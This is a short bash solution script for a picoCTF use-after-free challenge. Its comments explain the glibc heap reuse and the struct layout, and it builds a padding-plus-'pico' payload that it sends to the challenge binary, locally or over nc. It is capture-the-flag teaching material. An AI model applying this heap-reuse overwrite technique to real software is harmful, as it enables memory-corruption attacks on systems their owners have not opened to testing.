#!/bin/bash

# https://play.picoctf.org/practice/challenge/440

# This exploit is possible thanks to glibc's malloc implementation which
# reuses the freed memory. Compile chall.c with another backend like
# musl and the same solution may not work!

# Observe the `object` types memory layout:
## typedef struct {
##   char a[10];
##   char b[10];
##   char c[10];
##   char flag[5];
## } object;
# 10 bytes of 'a', 10 bytes of 'b', 10 bytes of 'c', 
# followed by 5 bytes for the flag.
SIZE_OF_OBJ=35

# First 30 bytes are object->{a,b,c} so object->flag
# begins 31 bytes after object
payload=$(printf 'A%.0s' {1..30})
# x->flag needs to be "pico"
payload+="pico"

echo -e "5 2 $SIZE_OF_OBJ $payload 4" | ./chall
# echo -e "5 2 $SIZE_OF_OBJ $payload 4" | nc "$SERVER" "$PORT"
